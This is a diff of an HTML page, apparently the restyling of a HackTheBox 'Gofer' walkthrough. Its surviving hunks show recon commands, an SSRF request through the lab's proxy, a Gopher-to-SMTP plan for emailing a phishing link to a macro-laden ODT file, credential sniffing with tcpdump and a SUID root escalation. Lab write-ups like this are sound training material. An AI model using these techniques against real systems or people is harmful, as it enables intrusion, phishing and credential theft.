@@ -1,16 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gofer - HTB</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
-    <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/styles.css" rel="stylesheet">
+    <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
-    <link href="/css/writeups.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
@@ -18,50 +17,79 @@
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
-            <aside class="sidebar">
+            <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="Logo">
+                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
                 </div>
                 <nav>
-                    <ul class="nav flex-column">
-                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
-                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
-                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
-                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
-                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
-                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
+                    <ul class="nav-menu">   
+                        <li class="nav-item">
+                            <a href="/" class="nav-link">
+                                <i>🏠</i>
+                                <span>Home</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/articles" class="nav-link active">
+                                <i>📝</i>
+                                <span>Articles</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/writeups" class="nav-link">
+                                <i>💻</i>
+                                <span>WriteUps</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/notes" class="nav-link">
+                                <i>📚</i>
+                                <span>Notes</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
+                                <i>⚡</i>
+                                <span>KL-Sunset</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/about" class="nav-link">
+                                <i>👤</i>
+                                <span>About me</span>
+                            </a>
+                        </li>
                     </ul>
                 </nav>
             </aside>
+
             <!-- Main Content -->
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%" src="/writeups/htb/hard/gofer/img/gofer.png">
-                <h2>Gofer - HTB</h2>
-                <p>walkthrough by elswix<p>
-                <ul class="machine-links" style="display: none">
-                    <li><a href="https://app.hackthebox.com/machines/Gofer">HackTheBox</a></li>
-                </ul>
-            </section>
+                    <img src="/writeups/htb/hard/gofer/img/gofer.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <h2>Gofer - HTB</h2>
+                    <p>walkthrough by elswixHackTheBox</p>
+                </section>
+
                 <section class="article-content">
-                    <div class="article-container">
-                        <div class="article-content-main">                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Gofer</span>
+<div class="article-container">
+<div class="article-content-main"> <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Gofer</span>
 <span class="k">Difficulty</span><span class="p">:</span> <span class="n">Hard</span>
 <span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
 <span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">07</span><span class="o">/</span><span class="mi">29</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About Gofer</h3><br/>
 Gofer is a hard-level machine on the HackTheBox platform. Initially, we encounter a network-level shared resource via SMB that leaks a file containing pertinent information for the first exploitation. It reveals details about an internal SMTP service at the system level. While enumerating subdomains, we discover a section that allows us to conduct an SSRF to interact with internal services of the victim machine.<br/><br/>
-<h3><br>Shell as Jocelyn</br></h3><br>
-Exploiting the SSRF, we utilized the Gopher protocol to send emails. We crafted a malicious ODT file and sent it via email to the user Jocelyn, enticing them to download and execute it, thereby gaining access to the system.<br/><br/>
-<h3><br>Shell as tbuckley</br></h3><br>
-As the user Jocelyn, we have the privilege to execute tcpdump, enabling us to sniff packets at the network level. While sniffing packets, we observed HTTP requests being made within the victim machine, within which credentials belonging to the user <code>tbuckley</code> were transmitted. We leveraged these credentials to gain SSH access to this user.<br/><br/>
-<h3><br>Shell as root</br></h3><br>
-As the user tbuckley, we are part of a group that has the privilege to execute an unusual Set-UID binary. After reverse-engineering the binary, we discovered a vulnerability that we could exploit to escalate privileges to the root user.<br/><br/>
-<h3><br>Recon</br></h3><br>
-Firstly, we will conduct a port scan to identify open ports on the target machine. To achieve this, we'll employ the <code>nmap</code> tool:<br/><br/>
+<h3><br/>Shell as Jocelyn</h3><br/>
+Exploiting the SSRF, we utilized the Gopher protocol to send emails. We crafted a malicious ODT file and sent it via email to the user Jocelyn, enticing them to download and execute it, thereby gaining access to the system.<br><br/>
+<h3><br/>Shell as tbuckley</h3><br/>
+As the user Jocelyn, we have the privilege to execute tcpdump, enabling us to sniff packets at the network level. While sniffing packets, we observed HTTP requests being made within the victim machine, within which credentials belonging to the user <code>tbuckley</code> were transmitted. We leveraged these credentials to gain SSH access to this user.<br><br/>
+<h3><br/>Shell as root</h3><br/>
+As the user tbuckley, we are part of a group that has the privilege to execute an unusual Set-UID binary. After reverse-engineering the binary, we discovered a vulnerability that we could exploit to escalate privileges to the root user.<br><br/>
+<h3><br/>Recon</h3><br/>
+Firstly, we will conduct a port scan to identify open ports on the target machine. To achieve this, we'll employ the <code>nmap</code> tool:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.225</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
 
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">2.2</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
@@ -105,8 +133,8 @@ Once more, we'll utilize the <code>nmap</code> tool:<br/><br/>
 </pre></div>
 
 At first glance, it's evident that the machine is running an SSH service, an HTTP service, and unusually, an SMB service, which is not commonly found on Linux machines.<br/><br/>
-<h3><br>SMB Enumeration</br></h3><br>
-We'll proceed to enumerate the SMB service using the <code>crackmapexec</code> tool:<br/><br/>
+<h3><br/>SMB Enumeration</h3><br/>
+We'll proceed to enumerate the SMB service using the <code>crackmapexec</code> tool:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.225</span>
 <span class="n">SMB</span>         <span class="mf">10.10.11.225</span>    <span class="mi">445</span>    <span class="n">GOFER</span>            <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">6.1</span> <span class="n">Build</span> <span class="mi">0</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">GOFER</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
 </pre></div>
@@ -175,8 +203,8 @@ Now, I'll be able to read its content using the <code>cat</code> command<br/><br
 </pre></div>
 
 It appears to be an email from <code>jdavis@gofer.htb</code> to <code>tbuckley@gofer.htb</code>. In the email, <code>jdavis</code> mentions a user named <code>Jocelyn</code> who has seemingly fallen victim to a phishing email. There's a reference to <code>.odt</code> files in the context of sharing files through emails. This information is crucial and serves as a key point to consider for the first exploit.<br/><br/>
-<h3><br>Web Application</br></h3><br>
-There's an HTTP Service running on port 80 on the victim machine. This service is associated with a webpage. To initiate the enumeration process, we'll perform a technology scan using the <code>whatweb</code> tool:<br/><br/>
+<h3><br/>Web Application</h3><br/>
+There's an HTTP Service running on port 80 on the victim machine. This service is associated with a webpage. To initiate the enumeration process, we'll perform a technology scan using the <code>whatweb</code> tool:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.225</span>
 <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.225</span> <span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.56</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Debian</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.56</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.225</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span>
 <span class="n">ERROR</span> <span class="n">Opening</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span> <span class="n">no</span> <span class="n">address</span> <span class="k">for</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span>
@@ -204,10 +232,10 @@ Now, upon attempting to access the service using the IP address, it redirects us
 </pre></div>
 
 Since there isn't any significant information available, let's access the website through our browser:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/2.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/2.png"><br/><br/>
 After spending some time browsing the site, I haven't come across anything noteworthy.<br/><br/>
-<h3><br>Subdomain Enumeration</br></h3><br>
-We'll proceed to enumerate subdomains using <code>ffuf</code>:<br/><br/>
+<h3><br/>Subdomain Enumeration</h3><br/>
+We'll proceed to enumerate subdomains using <code>ffuf</code>:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gofer</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.gofer.htb"</span> <span class="o">--</span><span class="n">fw</span><span class="o">=</span><span class="mi">20</span>
 
         <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
@@ -394,8 +422,8 @@ It's executing the request specified in the URL parameter, and I've received the
 <span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
 <span class="mf">10.10.11.225</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">12</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">26</span><span class="p">]</span> <span class="s2">"GET / HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
 </pre></div>
-<h3><br>SSRF</br></h3><br>
-Given that we can specify the URL for the machine to request, let's attempt to access an internal service on the victim machine that's not externally accessible.<br/><br/>
+<h3><br/>SSRF</h3><br/>
+Given that we can specify the URL for the machine to request, let's attempt to access an internal service on the victim machine that's not externally accessible.<br><br/>
 For instance, let's try to access the webpage hosted on port 80 on the local machine:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=http://127.0.0.1'</span>
 <span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
@@ -426,15 +454,15 @@ It's displaying an error as well. Let's explore techniques for bypassing blackli
 </pre></div>
 
 This yields a different output, indicating a potential successful bypass of the blacklist words security implementation.<br/><br/>
-<h3><br>Shell as jhudson</br></h3><br>
-It's evident at this stage that the machine's name becomes pivotal for this exploitation. Confirming that an Email Service is operating on port 25 on the victim machine (as indicated by the email from <code>jdavis@gofer.htb</code>), which highlighted a phishing attack that impacted the user Jocelyn. Jocelyn fell victim to this attack by clicking on a link without recognizing its source.<br/><br/>
+<h3><br/>Shell as jhudson</h3><br/>
+It's evident at this stage that the machine's name becomes pivotal for this exploitation. Confirming that an Email Service is operating on port 25 on the victim machine (as indicated by the email from <code>jdavis@gofer.htb</code>), which highlighted a phishing attack that impacted the user Jocelyn. Jocelyn fell victim to this attack by clicking on a link without recognizing its source.<br><br/>
 Our current strategy involves leveraging SSRF to send an email to the user Jocelyn, containing a malevolent link that directs to our attacker's machine. This link should prompt the download of a file with an ODT extension. ODT files are essentially text files used by the LibreOffice program. These file types enable the addition of macros containing malicious content, capable of executing undesired instructions on the system.<br/><br/>
 To send the email, we first need to determine the email of the user Jocelyn, which, judging by the structure of the email we've read, appears to be composed of the initial of the name and their last name.<br/><br/>
 In the "Team" section of the victim machine's main page, specifically on <code>gofer.htb</code>, we can view the names and last names of users that seem to be part of the team.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/3.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/3.png"><br/><br/>
 We managed to see the name "Jocelyn Hudson," which could belong to the user to whom we need to send the malicious email. First, let's adjust the name to fit the email format: <code>jhudson@gofer.htb</code>.<br/><br/>
-<h3><br>SSRF - Gopher</br></h3><br>
-There are some techniques to communicate with internal services when exploiting an SSRF, and in our case, we're going to use Gopher.<br/><br/>
+<h3><br/>SSRF - Gopher</h3><br/>
+There are some techniques to communicate with internal services when exploiting an SSRF, and in our case, we're going to use Gopher.<br><br/>
 <em>"Using this protocol you can specify the </em><em>IP, port and bytes</em><em> you want the server to </em><em>send</em><em>. Then, you can basically exploit a SSRF to </em><em>communicate with any TCP server</em><em> (but you need to know how to talk to the service first)."</em><br/><br/>
 <em><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher">HackTricks - SSRF</a></em><br/><br/>
 In HackTricks, there's an example payload to connect to an SMTP Server by exploiting an SSRF using Gopher://<br/><br/>
@@ -626,8 +654,8 @@ As <code>jhudson</code>, we can access the first flag.<br/><br/>
 <span class="mi">3</span><span class="n">af8d</span><span class="o">*********************</span><span class="mi">9784</span><span class="n">f</span>
 <span class="nd">jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
-<h3><br>Shell as tbuckley</br></h3><br>
-When listing the groups to which the user <code>jhudson</code> belongs, we can observe an unusual group:<br/><br/>
+<h3><br/>Shell as tbuckley</h3><br/>
+When listing the groups to which the user <code>jhudson</code> belongs, we can observe an unusual group:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">jhudson</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">jhudson</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">jhudson</span><span class="p">),</span><span class="mi">108</span><span class="p">(</span><span class="n">netdev</span><span class="p">)</span>
 </pre></div>
@@ -699,8 +727,8 @@ Given the attempt to authenticate as the user <code>tbuckley</code>, we can veri
 </pre></div>
 
 We've successfully accessed as the user <code>tbuckley</code> via SSH using the credentials obtained from the HTTP request.<br/><br/>
-<h3><br>Shell as root</br></h3><br>
-Listing the groups to which the user <code>tbuckley</code> belongs, we notice that they are part of the <code>dev</code> group:<br/><br/>
+<h3><br/>Shell as root</h3><br/>
+Listing the groups to which the user <code>tbuckley</code> belongs, we notice that they are part of the <code>dev</code> group:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">tbuckley@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">tbuckley</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">tbuckley</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">tbuckley</span><span class="p">),</span><span class="mi">1004</span><span class="p">(</span><span class="n">dev</span><span class="p">)</span>
 <span class="nd">tbuckley@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
@@ -857,8 +885,8 @@ If we restart the program and select option 2 without creating the user previous
 </pre></div>
 
 It seems that option 3 doesn't entirely delete the user we created.<br/><br/>
-<h3><br>Binary Analysis</br></h3><br>
-To perform a more in-depth analysis of the binary, I'll use the <a href="https://ghidra-sre.org/">Ghidra</a> tool for reverse engineering.<br/><br/>
+<h3><br/>Binary Analysis</h3><br/>
+To perform a more in-depth analysis of the binary, I'll use the <a href="https://ghidra-sre.org/">Ghidra</a> tool for reverse engineering.<br><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/21.png"/><br/><br/>
 The first thing that caught my attention was option 8, which required an <code>admin</code> role to access it.<br/><br/>
 Upon reading its code, we see the following:<br/><br/>
@@ -1167,15 +1195,17 @@ Now, by specifying the <code>-p</code> parameter, we can execute commands as roo
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1"># </span><span class="n">cat /root/root.txt</span>
 <span class="mi">5</span><span class="n">c398</span><span class="o">********************</span><span class="mi">5167</span><span class="n">e</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span>
-</pre></div></br></br></br></br></br></br></br></br></br></br></br></br></br>
-            </div>
+</pre></div></br></br></br></br></img></br></br></br></img></br></br></br></br></br></br>
+</div>
+</div>
+</section>
+<script src="/js/sidebarToggle.js"></script>
+<script src="/js/fixMobileImages.js"></script>
+<footer>
+<p>© 2024 elswix.github.io</p>
+</footer>
+            </main>
         </div>
-    </section>
-
-    <script src="/js/sidebarToggle.js"></script>
-    <script src="/js/fixMobileImages.js"></script>
-    <footer>
-        <p>&copy; 2024 elswix.github.io</p>
-    </footer>
+    </div>
 </body>
 </html>
